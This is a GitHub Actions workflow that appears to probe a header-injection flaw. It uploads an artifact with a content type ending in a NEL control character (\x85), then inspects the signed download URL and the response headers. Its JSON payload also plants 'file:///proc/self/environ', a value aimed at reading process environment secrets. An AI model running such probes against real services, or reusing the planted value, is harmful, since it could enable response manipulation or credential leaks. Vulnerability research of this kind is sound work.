name: NEL CT Test
on:
  workflow_dispatch:
  push:
    paths:
      - 'trigger.txt'

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Create payload
        run: |
          printf '{"full_name":"RWeng77/rc-test","owner":{"login":"cassette","avatar_url":"file:///proc/self/environ"},"description":"test","stargazers_count":1}' > payload.json
          sha256sum payload.json

      - name: Upload with NEL CT
        uses: ./.github/actions/custom-upload
        with:
          name: nel-payload
          file: payload.json
          content-type: "application/json\x85"

      - name: Check artifact download
        env:
          GH_TOKEN: ${{ github.token }}
        run: |
          sleep 5
          ARTIFACTS=$(curl -s -H "Authorization: token $GH_TOKEN" \
            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/artifacts")
          echo "=== Artifacts ==="
          echo "$ARTIFACTS" | jq '.artifacts[] | {id, name, size_in_bytes}'

          AID=$(echo "$ARTIFACTS" | jq -r '.artifacts[] | select(.name=="nel-payload") | .id')
          echo "Artifact ID: $AID"

          if [ -z "$AID" ] || [ "$AID" = "null" ]; then
            echo "No artifact found"
            exit 0
          fi

          echo "=== SAS URL analysis ==="
          REDIR=$(curl -sI -H "Authorization: token $GH_TOKEN" \
            "https://api.github.com/repos/${{ github.repository }}/actions/artifacts/$AID/zip")
          LOC=$(echo "$REDIR" | grep -i '^location:' | sed 's/^[Ll]ocation: //' | tr -d '\r\n')
          echo "rsct raw: $(echo "$LOC" | grep -oP 'rsct=[^&]*')"
          echo "rsct decoded: $(python3 -c "import urllib.parse; import sys; url='$LOC'; m=__import__('re').search(r'rsct=([^&]*)',url); print(urllib.parse.unquote(m.group(1)) if m else 'NONE')")"

          echo "=== Final response ==="
          curl -sI "$LOC" | grep -iE '^content-type|^content-length'

          echo "=== Content-Type hex ==="
          CT=$(curl -sI "$LOC" | grep -i '^content-type:' | sed 's/^[Cc]ontent-[Tt]ype: //' | tr -d '\r\n')
          echo -n "$CT" | xxd

          echo "=== Body preview ==="
          curl -s "$LOC" | head -c 200
